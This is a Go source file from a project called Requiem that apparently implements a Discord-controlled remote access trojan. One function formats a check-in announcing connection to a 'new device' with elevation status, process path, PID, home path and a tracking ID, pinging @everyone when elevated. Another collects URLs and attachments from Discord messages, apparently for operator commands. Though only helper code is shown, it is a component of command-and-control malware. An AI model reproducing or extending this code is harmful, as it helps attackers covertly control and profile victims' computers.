package discord

import (
	"fmt"
	"os"
	"regexp"

	"requiem/store"

	"github.com/bwmarrin/discordgo"
)

func GetConnectionMsg(new bool) string {
	mention := "@here"
	if store.IsAdmin {
		mention = "@everyone"
	}

	message := "Requiem has reconnected."
	if new {
		message = "Requiem has connected to a new device."
	}

	version := fmt.Sprintf(
		"[%d.%d.%d - %s]",
		store.VERSION_MAJOR,
		store.VERSION_MINOR,
		store.VERSION_PATCH,
		store.TRACKING_ID,
	)

	info := fmt.Sprintf(
		"Elevated: %t\nProcess Path: \"%s\"\nProcess ID: %d\nHome Path: \"%s\"",
		store.IsAdmin,
		store.ExecPath,
		os.Getpid(),
		store.HomePath,
	)

	return fmt.Sprintf(
		"%s %s %s\n%s\nDo `%shelp` for a list of commands.",
		mention,
		message,
		version,
		info,
		store.COMMAND_PREFIX,
	)
}

func GetUrls(msg *discordgo.MessageCreate) []string {
	var urls []string

	regex := regexp.MustCompile(`https?://[^\s]+`)

	matches := regex.FindAllString(msg.Content, -1)
	urls = append(urls, matches...)

	for _, attachment := range msg.Attachments {
		urls = append(urls, attachment.URL)
	}

	if msg.ReferencedMessage != nil {
		for _, attachment := range msg.ReferencedMessage.Attachments {
			urls = append(urls, attachment.URL)
		}

		matches := regex.FindAllString(msg.ReferencedMessage.Content, -1)
		urls = append(urls, matches...)
	}

	return urls
}
